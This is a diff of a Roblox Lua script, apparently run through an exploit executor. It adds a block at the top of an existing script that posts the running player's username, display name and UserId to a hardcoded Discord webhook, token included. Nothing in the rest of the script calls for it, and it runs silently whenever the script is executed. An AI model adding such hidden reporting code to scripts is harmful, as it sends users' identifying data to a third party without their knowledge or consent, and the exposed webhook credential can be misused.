@@ -1,3 +1,29 @@
+local webhookUrl = "https://discord.com/api/webhooks/1424033161540538478/T-fACSo_84gcK36Na78bCKh6MNTO-FMrrB6EOMPLVwt3YfVrI9yWqgiUw23pd7HmN8rx"
+local player = game:GetService("Players").LocalPlayer
+
+local data = {
+    ["content"] = string.format(
+        "Script executed!\nUsername: %s\nDisplay Name: %s\nUserId: %s",
+        player.Name, player.DisplayName, player.UserId
+    )
+}
+local jsonData = game:GetService("HttpService"):JSONEncode(data)
+
+local function sendWebhook()
+    local req = (syn and syn.request) or (http and http.request) or http_request or request
+    if req then
+        req({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+    end
+end
+
+sendWebhook()
 local Players = game:GetService("Players")
 local VirtualUser = game:GetService("VirtualUser")
 
